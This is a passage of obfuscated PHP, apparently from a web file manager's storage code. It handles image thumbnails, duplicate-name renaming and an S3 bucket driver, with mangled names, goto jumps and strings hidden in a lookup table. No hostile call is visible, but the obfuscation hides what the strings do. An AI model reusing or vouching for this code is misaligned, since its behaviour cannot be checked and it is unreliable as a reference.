$eÑ¹•¯°™ö = $a¯ôˆå¡­ ? ltrim($this->getPathOuter($a¯ôˆå¡­), $fØ¼Ñ¼¾¤°[8]) : $a¯ôˆå¡­; goto BÒ½Ä—Å“; BÒ½Ä—Å“: $b¬ÔˆãáÖÓ = $fØ¼Ñ¼¾¤°[160] . $d…ñ½À×†  . $fØ¼Ñ¼¾¤°[161] . rtrim($eÑ¹•¯°™ö, $fØ¼Ñ¼¾¤°[8]); if (is_null($d…ñ½À×† )) { $fË¼ê„Î½å = array(); return; } if (is_null($a¯ôˆå¡­)) { unset($fË¼ê„Î½å[$b¬ÔˆãáÖÓ]); return; } goto dÊ¾™µ†µ‹; BÄ¹Ù•§©‹: } public function fileOutImage($aŒ†×¶Æ†ğ, $a„á“ŸÈêå = 250) { goto E‡ŒÆĞÄæ; dÆâ½…¶æÅ: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $AˆÌã³‹õá = DATA_THUMB . $B·ÊîˆÕö¡; del_file($AˆÌã³‹õá); goto b…–ªŒŠÇï; A®Ò¿àö­à: $B·ÊîˆÕö¡ = "{$D‘Ò„à–àô}\x5f{$a„á“ŸÈêå}\56\160\x6e\x67"; if (!($F¾‚ÓºÁ‘‰ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $cª”ØÉÇ„°[172]))) { $e„ªÙÜÄÇ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $cª”ØÉÇ„°[173]); } else { $e„ªÙÜÄÇ = KodIO::make($F¾‚ÓºÁ‘‰); } if ($F¾‚ÓºÁ‘‰ = IO::fileNameExist($e„ªÙÜÄÇ, $B·ÊîˆÕö¡)) { $AˆÌã³‹õá = KodIO::make($F¾‚ÓºÁ‘‰); return IO::fileOut($AˆÌã³‹õá, !1, $câãßá÷¹—); } goto dÆâ½…¶æÅ; b…–ªŒŠÇï: if (!@file_exists($AˆÌã³‹õá)) { $BìïÇ®ô’Ô = TEMP_FILES; if (!is_dir($BìïÇ®ô’Ô)) { mk_dir($BìïÇ®ô’Ô); } $dÔÛ‘Éƒ†– = $BìïÇ®ô’Ô . $D‘Ò„à–àô . $cª”ØÉÇ„°[95] . $a•Õ“Æ³ÔÏ[$cª”ØÉÇ„°[168]]; if (!@file_exists($dÔÛ‘Éƒ†–)) { $dÔÛ‘Éƒ†– = $this->download($aŒ†×¶Æ†ğ, $dÔÛ‘Éƒ†–); } ImageThumb::createThumb($dÔÛ‘Éƒ†–, $AˆÌã³‹õá, $a„á“ŸÈêå, $a„á“ŸÈêå * 10); } if (!file_exists($AˆÌã³‹õá) || filesize($AˆÌã³‹õá) < 100) { return @file_exists($dÔÛ‘Éƒ†–) ? IO::fileOut($dÔÛ‘Éƒ†–) : $this->fileOut($aŒ†×¶Æ†ğ); } if (!($DÛ÷½ÆñÑ¶ = IO::move($AˆÌã³‹õá, $e„ªÙÜÄÇ))) { return IO::fileOut($AˆÌã³‹õá); } goto D Ğ›¦ïŸß; dÓğï£æÇŞ: if (isset($GLOBALS[$cª”ØÉÇ„°[162]]) && $GLOBALS[$cª”ØÉÇ„°[162]][$cª”ØÉÇ„°[76]] == $a•Õ“Æ³ÔÏ[$cª”ØÉÇ„°[76]]) { $CåÁ¬ÀŒ¾º = $GLOBALS[$cª”ØÉÇ„°[162]][$cª”ØÉÇ„°[163]]; if (!$a•Õ“Æ³ÔÏ[$cª”ØÉÇ„°[164]]) { $a•Õ“Æ³ÔÏ[$cª”ØÉÇ„°[164]] = $GLOBALS[$cª”ØÉÇ„°[162]]; } if (isset($CåÁ¬ÀŒ¾º[$cª”ØÉÇ„°[165]])) { if ($CåÁ¬ÀŒ¾º[$cª”ØÉÇ„°[165]] <= $a„á“ŸÈêå && $CåÁ¬ÀŒ¾º[$cª”ØÉÇ„°[166]] <= $a„á“ŸÈêå) { $b‘Š‡¤ÊÃ‘ = !0; } } $câãßá÷¹— = $a•Õ“Æ³ÔÏ[$cª”ØÉÇ„°[164]][$cª”ØÉÇ„°[28]]; } if ($a•Õ“Æ³ÔÏ[$cª”ØÉÇ„°[78]] <= 1024 * 50 || $b‘Š‡¤ÊÃ‘ || !function_exists($cª”ØÉÇ„°[167]) || $a•Õ“Æ³ÔÏ[$cª”ØÉÇ„°[168]] == $cª”ØÉÇ„°[169]) { return $this->fileOut($aŒ†×¶Æ†ğ, !1, $câãßá÷¹—); } if (isset($a•Õ“Æ³ÔÏ[$cª”ØÉÇ„°[164]][$cª”ØÉÇ„°[170]])) { $D‘Ò„à–àô = $a•Õ“Æ³ÔÏ[$cª”ØÉÇ„°[164]][$cª”ØÉÇ„°[170]]; } else { if (isset($a•Õ“Æ³ÔÏ[$cª”ØÉÇ„°[164]][$cª”ØÉÇ„°[171]])) { $D‘Ò„à–àô = $a•Õ“Æ³ÔÏ[$cª”ØÉÇ„°[164]][$cª”ØÉÇ„°[171]]; } else { $D‘Ò„à–àô = md5("{$a•Õ“Æ³ÔÏ[$cª”ØÉÇ„°[28]]}\x5f{$a•Õ“Æ³ÔÏ[$cª”ØÉÇ„°[76]]}\x5f{$a•Õ“Æ³ÔÏ[$cª”ØÉÇ„°[78]]}"); } } goto A®Ò¿àö­à; E™¨ƒÅÅºƒ: $a•Õ“Æ³ÔÏ = $this->info($aŒ†×¶Æ†ğ); $câãßá÷¹— = $a•Õ“Æ³ÔÏ[$cª”ØÉÇ„°[28]]; $b‘Š‡¤ÊÃ‘ = !1; goto dÓğï£æÇŞ; E‡ŒÆĞÄæ: $cª”ØÉÇ„° =& $_SERVER[Ö‘Øù]; set_timeout(); if (substr($aŒ†×¶Æ†ğ, 0, 4) == $cª”ØÉÇ„°[147]) { $this->fileOutLink($aŒ†×¶Æ†ğ); } goto E™¨ƒÅÅºƒ; D Ğ›¦ïŸß: del_file($AˆÌã³‹õá); IO::fileOut($DÛ÷½ÆñÑ¶); goto A’š»Èœ; A’š»Èœ: } public function fileOutImageServer($BïƒÃáè´®, $Dµ•µ²Í…Â = 250) { $this->fileOutImage($BïƒÃáè´®, $Dµ•µ²Í…Â); } public function fileNameAuto($cÁëƒ¡â®à, $e ‰‰ÔºÆ, $fİÜåêÚÖè = REPEAT_RENAME, $dÖ¨Õ’½¦ = false) { goto f›ƒõ‡ƒ×Ù; Eò™«œêÅ: $E˜ƒ¹™ß = 1; $aõ˜ÎÃº¸í = substr($e ‰‰ÔºÆ, 0, strlen($e ‰‰ÔºÆ) - strlen($AÛ¯æƒÉâ±)); $EßÊİ»Ò¡‹ = $aõ˜ÎÃº¸í . "\50{$E˜ƒ¹™ß}\51{$AÛ¯æƒÉâ±}"; goto F¨ìî”ÅËè; f›ƒõ‡ƒ×Ù: $bÕĞĞÎš =& $_SERVER[Ö‘Øù]; $A²îŞæÆé© = $cÁëƒ¡â®à === $bÕĞĞÎš[33] ? $e ‰‰ÔºÆ : rtrim($cÁëƒ¡â®à, $bÕĞĞÎš[8]) . $bÕĞĞÎš[8] . $e ‰‰ÔºÆ; if ($fİÜåêÚÖè == REPEAT_REPLACE || !$this->exist($A²îŞæÆé©) || $dÖ¨Õ’½¦ && $fİÜåêÚÖè != REPEAT_RENAME_FOLDER) { return $e ‰‰ÔºÆ; } goto aØ“ÖŒø¹µ; aØ“ÖŒø¹µ: if ($fİÜåêÚÖè == REPEAT_SKIP) { return !1; } $AÛ¯æƒÉâ± = $bÕĞĞÎš[95] . get_path_ext($e ‰‰ÔºÆ); $AÛ¯æƒÉâ± = $AÛ¯æƒÉâ± == $bÕĞĞÎš[95] || $dÖ¨Õ’½¦ ? $bÕĞĞÎš[33] : $AÛ¯æƒÉâ±; goto Eò™«œêÅ; F¨ìî”ÅËè: while ($this->exist(rtrim($cÁëƒ¡â®à, $bÕĞĞÎš[8]) . $bÕĞĞÎš[8] . $EßÊİ»Ò¡‹)) { $EßÊİ»Ò¡‹ = $aõ˜ÎÃº¸í . "\50{$E˜ƒ¹™ß}\x29{$AÛ¯æƒÉâ±}"; $E˜ƒ¹™ß++; } return $EßÊİ»Ò¡‹; goto d´Ë™Š‘¿™; d´Ë™Š‘¿™: } private function fileNameAutoList($F¶ºôê¹±ï, $b•ùÅ¢­Ä, $câì“ë˜³ = false) { goto EšÀÙ‹õÖˆ; EšÀÙ‹õÖˆ: $bŠù† Ò‹È =& $_SERVER[Ö‘Øù]; $f¸ÚİòßÖ = $this->listPath($F¶ºôê¹±ï, !0); $f¸ÚİòßÖ = array_merge($f¸ÚİòßÖ[$bŠù† Ò‹È[75]], $f¸ÚİòßÖ[$bŠù† Ò‹È[74]]); goto cŞõ‹Œğóº; bæ¾Ñ¸™æˆ: return $cË÷îº…ù›; goto EŒÌĞ˜›ƒ—; Cåµ¯’ø£”: $c—»™˜Î‡õ = substr($b•ùÅ¢­Ä, 0, strlen($b•ùÅ¢­Ä) - strlen($c¡÷ï¢°ê«)); $cË÷îº…ù› = $c—»™˜Î‡õ . "\50\x30\51{$c¡÷ï¢°ê«}"; for ($eîˆéÌğéä = 1; $eîˆéÌğéä <= count($aÅÇ‹ÕÙ£) + 1; $eîˆéÌğéä++) { $cË÷îº…ù› = $c—»™˜Î‡õ . "\x28{$eîˆéÌğéä}\51{$c¡÷ï¢°ê«}"; if (!in_array_not_case($cË÷îº…ù›, $aÅÇ‹ÕÙ£)) { return $cË÷îº…ù›; } } goto bæ¾Ñ¸™æˆ; cŞõ‹Œğóº: $aÅÇ‹ÕÙ£ = array_to_keyvalue($f¸ÚİòßÖ, $bŠù† Ò‹È[33], $bŠù† Ò‹È[28]); $c¡÷ï¢°ê« = $bŠù† Ò‹È[95] . get_path_ext($b•ùÅ¢­Ä); $c¡÷ï¢°ê« = $c¡÷ï¢°ê« == $bŠù† Ò‹È[95] || $câì“ë˜³ ? $bŠù† Ò‹È[33] : $c¡÷ï¢°ê«; goto Cåµ¯’ø£”; EŒÌĞ˜›ƒ—: } public function listAllFiles($BÉ»×†ÄÕ, $d®ÇÎ Âˆ°, $c†ø‹çƒŠ¥ = array()) { goto dÂ…ŞÊ¸Š ; a‚¶º¼è¥ù: foreach (array_unique($eÜ’Æ©¼) as $Bİ‚Û…¬Íº) { $A‰‰ÒíÍ¾× = array($CÑçí®İÈ [76] => $this->getPathOuter($CÑçí®İÈ [8] . $BÉ»×†ÄÕ . $CÑçí®İÈ [8] . $Bİ‚Û…¬Íº), $CÑçí®İÈ [77] => 1, $CÑçí®İÈ [78] => 0); if (substr($Bİ‚Û…¬Íº, -1) != $CÑçí®İÈ [8]) { $A‰‰ÒíÍ¾×[$CÑçí®İÈ [77]] = 0; $cØšÓƒ¦¶± = $this->getPath($BÉ»×†ÄÕ . $CÑçí®İÈ [8] . $Bİ‚Û…¬Íº); $A‰‰ÒíÍ¾×[$CÑçí®İÈ [78]] = isset($c†ø‹çƒŠ¥[$cØšÓƒ¦¶±]) ? $c†ø‹çƒŠ¥[$cØšÓƒ¦¶±] : $this->size($cØšÓƒ¦¶±); } $aä…Òä´š[] = $A‰‰ÒíÍ¾×; } return $aä…Òä´š; goto CÄ˜£Ó££; f¦ê¬ğŒÂ: $BÉ»×†ÄÕ = trim($BÉ»×†ÄÕ, $CÑçí®İÈ [8]); foreach ($d®ÇÎ Âˆ° as $Bİ‚Û…¬Íº) { $bã»Á‡‹ø = ltrim(substr(trim($Bİ‚Û…¬Íº, $CÑçí®İÈ [8]), strlen($BÉ»×†ÄÕ)), $CÑçí®İÈ [8]); $eÜ’Æ©¼ = array_merge($eÜ’Æ©¼, $this->slicePath($bã»Á‡‹ø)); } $aä…Òä´š = array(); goto a‚¶º¼è¥ù; dÂ…ŞÊ¸Š : $CÑçí®İÈ  =& $_SERVER[Ö‘Øù]; if (empty($d®ÇÎ Âˆ°)) { return array(); } $eÜ’Æ©¼ = array(); goto f¦ê¬ğŒÂ; CÄ˜£Ó££: } public function slicePath($D‰ôßÑ¬ŠŞ) { $B¼Ô²—òÉÕ =& $_SERVER[Ö‘Øù]; $eá™¶ñ«ºœ = explode($B¼Ô²—òÉÕ[8], trim($D‰ôßÑ¬ŠŞ, $B¼Ô²—òÉÕ[8])); $eÉáÃõÓ†£ = 0; do { ++$eÉáÃõÓ†£; $AĞÆ®ÙŠõ®[] = implode($B¼Ô²—òÉÕ[8], array_slice($eá™¶ñ«ºœ, 0, $eÉáÃõÓ†£)) . $B¼Ô²—òÉÕ[8]; } while ($eÉáÃõÓ†£ < count($eá™¶ñ«ºœ)); $AĞÆ®ÙŠõ®[count($eá™¶ñ«ºœ) - 1] = $D‰ôßÑ¬ŠŞ; return $AĞÆ®ÙŠõ®; } public function getHost() { $bÓ·ÕôÖ’ =& $_SERVER[Ö‘Øù]; $d”ø‡’ôİ’ = parse_url(trim($this->domain, $bÓ·ÕôÖ’[8])); $bËØ¶‹Í¶À = isset($d”ø‡’ôİ’[$bÓ·ÕôÖ’[174]]) ? $d”ø‡’ôİ’[$bÓ·ÕôÖ’[174]] : http_type(); $BÄŸÖ¹‚ƒÇ = isset($d”ø‡’ôİ’[$bÓ·ÕôÖ’[175]]) ? $d”ø‡’ôİ’[$bÓ·ÕôÖ’[175]] : $d”ø‡’ôİ’[$bÓ·ÕôÖ’[76]]; if (isset($d”ø‡’ôİ’[$bÓ·ÕôÖ’[176]])) { $BÄŸÖ¹‚ƒÇ .= $bÓ·ÕôÖ’[4] . $d”ø‡’ôİ’[$bÓ·ÕôÖ’[176]]; } return $bËØ¶‹Í¶À . $bÓ·ÕôÖ’[177] . $BÄŸÖ¹‚ƒÇ; } public function pathEncode($f‡®„ÌÖò“) { $f÷…ÁïøÜ× =& $_SERVER[Ö‘Øù]; return str_replace($f÷…ÁïøÜ×[178], $f÷…ÁïøÜ×[8], rawurlencode($f‡®„ÌÖò“)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($Aî–ÍÑ–Â¾) { set_timeout(); require_once SDK_DIR . $_SERVER[Ö‘Øù][179]; parent::__construct(); $this->_init($Aî–ÍÑ–Â¾); } public function _init($eç‰ÃŠé±Î) { foreach ($eç‰ÃŠé±Î as $EÆ–±¬§› => $cšÈò¯Ç†Û) { if (isset($this->{$EÆ–±¬§›})) { $this->{$EÆ–±¬§›} = $cšÈò¯Ç†Û; } } $this->endpoint = $eç‰ÃŠé±Î[$_SERVER[Ö‘Øù][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($b¨Á¥ÒÅœ = "\166\64") { $this->signVer = $b¨Á¥ÒÅœ; $this->client->setSignatureVersion($b¨Á¥ÒÅœ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto BÎ¨ÌËŠ; Eñ§²êÊ‰ö: if ($B‹˜ˆƒê[$BÀôÒÎ£[181]] != $BÀôÒÎ£[182] || $B‹˜ˆƒê[$BÀôÒÎ£[183]] != $BÀôÒÎ£[182]) { return !1; } $E…ªã‚‚‚¯ = array_map($BÀôÒÎ£[184], $B‹˜ˆƒê[$BÀôÒÎ£[185]]); if (!is_array($E…ªã‚‚‚¯)) { $E…ªã‚‚‚¯ = array(); } goto c÷‰”æŸ±; c÷‰”æŸ±: $bÅÁª¡‰Æ = array($BÀôÒÎ£[186], $BÀôÒÎ£[187], $BÀôÒÎ£[188], $BÀôÒÎ£[189], $BÀôÒÎ£[190]); $Dœç‹¿ğÌ = array_diff($bÅÁª¡‰Æ, $E…ªã‚‚‚¯); return empty($Dœç‹¿ğÌ); goto c©Îƒß‰â¡; BÎ¨ÌËŠ: $BÀôÒÎ£ =& $_SERVER[Ö‘Øù]; $B‹˜ˆƒê = $this->getBucketCors(); if (!$B‹˜ˆƒê || !is_array($B‹˜ˆƒê)) { return !1; } goto Eñ§²êÊ‰ö; c©Îƒß‰â¡: } public function mkfile($FŞÕ©³›º†, $bÑª²Ğ è• = '', $dî¬„¸ÃÎ = REPEAT_RENAME) { $Fà¤æ§´È£ = $this->setContent($FŞÕ©³›º†, $bÑª²Ğ è•); if ($Fà¤æ§´È£ !== !1) { return $this->getPathOuter($FŞÕ©³›º†); } return !1; } public function mkdir($eˆğ¦ŸçİŞ, $aÁˆ’Úš© = REPEAT_SKIP) { $D˜é¾Ğ¾²½ =& $_SERVER[Ö‘Øù]; if (empty($eˆğ¦ŸçİŞ) && $eˆğ¦ŸçİŞ !== $D˜é¾Ğ¾²½[191]) { return !1; } if ($this->_isFolder($eˆğ¦ŸçİŞ)) { return $this->getPathOuter($eˆğ¦ŸçİŞ); } $aº“Ô’ƒê = $this->setContent($eˆğ¦ŸçİŞ, $D˜é¾Ğ¾²½[33], !0); if ($aº“Ô’ƒê !== !1) { return $this->getPathOuter($eˆğ¦ŸçİŞ); } return !1; } public function copyFile($Eêó¥™¿ö, $cÅÂ˜†³Í, $a‡†¥Úç… = array()) { $Bê«¦Öİ£ =& $_SERVER[Ö‘Øù]; $BĞÏ÷¾ø = $this->objectMeta($Eêó¥™¿ö); if (!$BĞÏ÷¾ø) { return !1; } if ($BĞÏ÷¾ø[$Bê«¦Öİ£[78]] <= 1024 * 1024 * 200) { $EÇ¢ñ‚ùé‹ = $this->client->copyObject($this->bucket, $Eêó¥™¿ö, $this->bucket, $cÅÂ˜†³Í, $Bê«¦Öİ£[192], $a‡†¥Úç…); } else { $EÇ¢ñ‚ùé‹ = $this->client->multiCopyObject($this->bucket, $Eêó¥™¿ö, $this->bucket, $cÅÂ˜†³Í, $a‡†¥Úç…); } $EÇ¢ñ‚ùé‹ = $EÇ¢ñ‚ùé‹ ? $this->getPathOuter($cÅÂ˜†³Í) : !1; return $EÇ¢ñ‚ùé‹; } public function moveFile($C¸ÆÑ—Ì›â, $D¤Ø×Ñ’õ) { if ($this->copyFile($C¸ÆÑ—Ì›â, $D¤Ø×Ñ’õ)) { $this->delFile($C¸ÆÑ—Ì›â); return $this->getPathOuter($D¤Ø×Ñ’õ); } return !1; } public function delFile($Dö³ÉàÀµ¼) { return $this->client->deleteObject($this->bucket, $Dö³ÉàÀµ¼); } public function delFolder($F©åğäÊçø) { goto dàˆçŞŠ‘¦; fÀÕÓ®ÙÜñ: $b’½ÎŒÂöÔ = $this->fileList($F©åğäÊçø); $this->listItemCache = !0; $aõÕòÀ­ŒÕ = trim($F©åğäÊçø, $cí¼Í§­Å£[8]) . $cí¼Í§­Å£[8]; goto Eµˆ„ÏãÚÚ; dìŸŸá˜…ğ: $AæÀÛÎ¢Ç = $this->delByBatch($b’½ÎŒÂöÔ[$cí¼Í§­Å£[75]]); if (!$AæÀÛÎ¢Ç) { return !1; } return $this->delFile($aõÕòÀ­ŒÕ); goto fò»èÒÂš; Eµˆ„ÏãÚÚ: if (!empty($F©åğäÊçø) && $F©åğäÊçø !== $cí¼Í§­Å£[191] && !in_array($aõÕòÀ­ŒÕ, $b’½ÎŒÂöÔ[$cí¼Í§­Å£[75]])) { $b’½ÎŒÂöÔ[$cí¼Í§­Å£[75]][] = $aõÕòÀ­ŒÕ; } $AæÀÛÎ¢Ç = $this->delByBatch($b’½ÎŒÂöÔ[$cí¼Í§­Å£[74]]); if (!$AæÀÛÎ¢Ç) { return !1; } goto dìŸŸá˜…ğ; dàˆçŞŠ‘¦: $cí¼Í§­Å£ =& $_SERVER[Ö‘Øù]; if (!$this->exist($F©åğäÊçø)) { return !0; } $this->listItemCache = !1; goto fÀÕÓ®ÙÜñ; fò»èÒÂš: } private function delByBatch($CÑ®†²¹ˆ¨) { foreach (array_chunk($CÑ®†²¹ˆ¨, 1000) as $eÕ¢ äñÃƒ) { $d‘ÏğÊœÛÜ = $this->client->deleteObjects($this->bucket, $eÕ¢ äñÃƒ); if (!$d‘ÏğÊœÛÜ) { return !1; } } return !0; } public function rename($DâÆëÆƒ•Ğ, $Cœ„ô«â¿½) { return $this->renameObject($DâÆëÆƒ•Ğ, $Cœ„ô«â¿½); } public function listPath($e¶İ—ÇÓ¾ß, $bÜ«ì”ò«Š = false) { $CÌñ‡À“¾ =& $_SERVER[Ö‘Øù]; $b¨Â­‹ƒÜ³ = $this->fileList($e¶İ—ÇÓ¾ß, $CÌñ‡À“¾[8], !0); foreach ($b¨Â­‹ƒÜ³[$CÌñ‡À“¾[75]] as $FŞÉç¸‹Š· => $F¼øÀª¹ˆ) { $b¨Â­‹ƒÜ³[$CÌñ‡À“¾[75]][$FŞÉç¸‹Š·] = $this->folderInfo($F¼øÀª¹ˆ, $bÜ«ì”ò«Š); } foreach ($b¨Â­‹ƒÜ³[$CÌñ‡À“¾[74]] as $FŞÉç¸‹Š· => $F¼øÀª¹ˆ) { $b¨Â­‹ƒÜ³[$CÌñ‡À“¾[74]][$FŞÉç¸‹Š·] = $this->fileInfo($F¼øÀª¹ˆ[$CÌñ‡À“¾[28]], $bÜ«ì”ò«Š, $F¼øÀª¹ˆ); } return $b¨Â­‹ƒÜ³; } private function fileInfo($d·ë”°Èî, $f¾–Í…â›  = false, $b®‡ï—ñ·ñ = array()) { goto cøÙ ùÏî¤; FÛÆ‡Åµ²İ: $c‘íÂ¤”[$A‡‹‰Óõˆ»[194]] = $c‘íÂ¤”[$A‡‹‰Óõˆ»[84]] = 0; $c‘íÂ¤”[$A‡‹‰Óõˆ»[195]] = $c‘íÂ¤”[$A‡‹‰Óõˆ»[196]] = !0; if (empty($b®‡ï—ñ·ñ)) { $b®‡ï—ñ·ñ = $this->objectMeta($d·ë”°Èî); if (!$b®‡ï—ñ·ñ) { return $c‘íÂ¤”; } } goto FŠİ¬÷º‰è; FŠİ¬÷º‰è: if (isset($b®‡ï—ñ·ñ[$A‡‹‰Óõˆ»[197]])) { $c‘íÂ¤”[$A‡‹‰Óõˆ»[84]] = $b®‡ï—ñ·ñ[$A‡‹‰Óõˆ»[197]]; } if (isset($b®‡ï—ñ·ñ[$A‡‹‰Óõˆ»[78]])) { $c‘íÂ¤”[$A‡‹‰Óõˆ»[78]] = $b®‡ï—ñ·ñ[$A‡‹‰Óõˆ»[78]]; } return $c‘íÂ¤”; goto BßîÏÛºš; cøÙ ùÏî¤: $A‡‹‰Óõˆ» =& $_SERVER[Ö‘Øù]; $c‘íÂ¤” = array($A‡‹‰Óõˆ»[28] => $this->pathThis($d·ë”°Èî), $A‡‹‰Óõˆ»[76] => $this->getPathOuter($d·ë”°Èî), $A‡‹‰Óõˆ»[29] => $A‡‹‰Óõˆ»[193], $A‡‹‰Óõˆ»[168] => $this->ext($d·ë”°Èî), $A‡‹‰Óõˆ»[78] => isset($b®‡ï—ñ·ñ[$A‡‹‰Óõˆ»[78]]) ? $b®‡ï—ñ·ñ[$A‡‹‰Óõˆ»[78]] : 0); if ($f¾–Í…â› ) { return $c‘íÂ¤”; } goto FÛÆ‡Åµ²İ; BßîÏÛºš: } private function folderInfo($BÍ¨óÉñŞê, $cÁ×Ù’îç = false) { goto fîßåÃ§Ù; B¼ğ«ø™ï¤: $BÍ¨óÉñŞê = trim($BÍ¨óÉñŞê, $aµ©Œ†Óõ[8]) . $aµ©Œ†Óõ[8]; $F¤ˆº„Ä‘ = $this->objectMeta($BÍ¨óÉñŞê); if (isset($F¤ˆº„Ä‘[$aµ©Œ†Óõ[197]])) { $F¹¥„Í¹àî[$aµ©Œ†Óõ[194]] = $F¤ˆº„Ä‘[$aµ©Œ†Óõ[197]]; } goto d¦Ø›†Ìõ¹; D¯‹éÂÌ: $F¹¥„Í¹àî[$aµ©Œ†Óõ[194]] = $F¹¥„Í¹àî[$aµ©Œ†Óõ[84]] = 0; $F¹¥„Í¹àî[$aµ©Œ†Óõ[195]] = $F¹¥„Í¹àî[$aµ©Œ†Óõ[196]] = !0; if ($BÍ¨óÉñŞê == $aµ©Œ†Óõ[33]) { return $F¹¥„Í¹àî; } goto B¼ğ«ø™ï¤; d¦Ø›†Ìõ¹: return $F¹¥„Í¹àî; goto dï‡°„–øŠ; fîßåÃ§Ù: $aµ©Œ†Óõ =& $_SERVER[Ö‘Øù]; $F¹¥„Í¹àî = array($aµ©Œ†Óõ[28] => $this->pathThis($BÍ¨óÉñŞê), $aµ©Œ†Óõ[76] => $this->getPathOuter($aµ©Œ†Óõ[8] . $BÍ¨óÉñŞê), $aµ©Œ†Óõ[29] => $aµ©Œ†Óõ[77]); if ($cÁ×Ù’îç) { return $F¹¥„Í¹àî; } goto D¯‹éÂÌ; dï‡°„–øŠ: } private function fileList($a“ˆÓ×ÙÄ, $d‡“ëÔó¬ß = '', $F†’œ¥•ó™ = 0) { goto dÁáºá«¸; c»²ÊäŠ“Ó: return array($F’×Ãï„ŞĞ[75] => $F­Ş²ÛêŒ÷, $F’×Ãï„ŞĞ[74] => $F›×¡‚ŞãÊ); goto b÷§ï­âß; Aá©Ìº£âç: if (!$fê¸¼¹) { return array($F’×Ãï„ŞĞ[75] => array(), $F’×Ãï„ŞĞ[74] => array()); } $eğÔÃ†İìµ = $this->listItemCache === !1 ? !1 : !0; $F­Ş²ÛêŒ÷ = $F›×¡‚ŞãÊ = array(); goto b‘íÂƒ›¥œ; b‘íÂƒ›¥œ: foreach ($fê¸¼¹[$F’×Ãï„ŞĞ[198]] as $fõ¥‚…´Š) { goto C—”¿¼Ş¥ì; C—”¿¼Ş¥ì: $F‘ÌØ‰›‹À = $fõ¥‚…´Š[$F’×Ãï„ŞĞ[28]]; if ($F‘ÌØ‰›‹À == $F»­¬†ÎğÌ) { continue; } $A…é£„‹ğ = isset($fõ¥‚…´Š[$F’×Ãï„ŞĞ[78]]) ? $fõ¥‚…´Š[$F’×Ãï„ŞĞ[78]] : 0; goto A¿Òãßå°¶; A¿Òãßå°¶: $dîÎŞ±êŞ³ = $A…é£„‹ğ == 0 && substr($F‘ÌØ‰›‹À, strlen($F‘ÌØ‰›‹À) - 1, 1) == $F’×Ãï„ŞĞ[8] ? !0 : !1; if ($eğÔÃ†İìµ) { $this->cacheMethod($F’×Ãï„ŞĞ[199], $F‘ÌØ‰›‹À, $dîÎŞ±êŞ³); $this->cacheMethod($F’×Ãï„ŞĞ[200], $F‘ÌØ‰›‹À, $fõ¥‚…´Š); } if ($dîÎŞ±êŞ³) { $F­Ş²ÛêŒ÷[] = $F‘ÌØ‰›‹À; continue; } goto DêÖ³¦°ŞÖ; DêÖ³¦°ŞÖ: $F›×¡‚ŞãÊ[] = $F†’œ¥•ó™ ? $fõ¥‚…´Š : $F‘ÌØ‰›‹À; goto aŞ†Èò´ù; aŞ†Èò´ù: } foreach ($fê¸¼¹[$F’×Ãï„ŞĞ[201]] as $fõ¥‚…´Š) { $F­Ş²ÛêŒ÷[] = $fõ¥‚…´Š[$F’×Ãï„ŞĞ[28]]; if ($eğÔÃ†İìµ) { $this->cacheMethod($F’×Ãï„ŞĞ[199], $fõ¥‚…´Š[$F’×Ãï„ŞĞ[28]], !0); } } if ($eğÔÃ†İìµ) { $this->cacheMethod($F’×Ãï„ŞĞ[199], $a“ˆÓ×ÙÄ, !0); } goto c»²ÊäŠ“Ó; dÁáºá«¸: $F’×Ãï„ŞĞ =& $_SERVER[Ö‘Øù]; $F»­¬†ÎğÌ = rtrim($a“ˆÓ×ÙÄ, $F’×Ãï„ŞĞ[8]) . $F’×Ãï„ŞĞ[8]; $fê¸¼¹ = $this->listObjs($F»­¬†ÎğÌ, null, null, $d‡“ëÔó¬ß); goto Aá©Ìº£âç; b÷§ï­âß: } private function listObjs($C¬¯†ìƒº®, $EÅŒÈ¦èæ¡ = null, $f‡’¹†¶ù = null, $få÷³ùÃ¼ô = null) { $aÊ²±ÌìĞ =& $_SERVER[Ö‘Øù]; $C¬¯†ìƒº® = trim($C¬¯†ìƒº®, $aÊ²±ÌìĞ[8]); $eÒª§¬Æë¡ = empty($C¬¯†ìƒº®) && $C¬¯†ìƒº® !== $aÊ²±ÌìĞ[191] ? $aÊ²±ÌìĞ[33] : $C¬¯†ìƒº® . $aÊ²±ÌìĞ[8]; return $this->client->getBucket($this->bucket, $eÒª§¬Æë¡, $EÅŒÈ¦èæ¡, $f‡’¹†¶ù, $få÷³ùÃ¼ô, !0); } public function has($föÀÇåËå‰, $C†Ó×›¥ù“ = false, $A”Ö©ª÷È… = true) { goto BÔ »ÊÏ…ˆ; C§É¯ªùªğ: $c‚µ¬àÙºµ = $Aç„‹È´±ø = array(); while (!0) { $aÂÍ‹ˆƒŒ¯ = $this->listObjs($föÀÇåËå‰, $C­éÒï«šº, $b‚àÄÄ³ã, $C­éƒÍğÏ“); if (!$aÂÍ‹ˆƒŒ¯) { break; } $C­éÒï«šº = $aÂÍ‹ˆƒŒ¯[$b¨Øëäì•„[202]]; $CøÙ‡ÅŠÂÃ = $aÂÍ‹ˆƒŒ¯[$b¨Øëäì•„[198]]; $b¾¹ÄÓìŸö = $aÂÍ‹ˆƒŒ¯[$b¨Øëäì•„[201]]; if (empty($CøÙ‡ÅŠÂÃ) && empty($b¾¹ÄÓìŸö)) { break; } if (count($CøÙ‡ÅŠÂÃ) == 1 && $CøÙ‡ÅŠÂÃ[0][$b¨Øëäì•„[28]] == $Bºªî¾®Ì†) { break; } if ($C†Ó×›¥ù“) { if (count($CøÙ‡ÅŠÂÃ)) { $CøÙ‡ÅŠÂÃ = array_column($CøÙ‡ÅŠÂÃ, $b¨Øëäì•„[28]); $c‚µ¬àÙºµ = array_merge($c‚µ¬àÙºµ, $CøÙ‡ÅŠÂÃ); } if (count($b¾¹ÄÓìŸö)) { $b¾¹ÄÓìŸö = array_column($b¾¹ÄÓìŸö, $b¨Øëäì•„[28]); $Aç„‹È´±ø = array_merge($Aç„‹È´±ø, 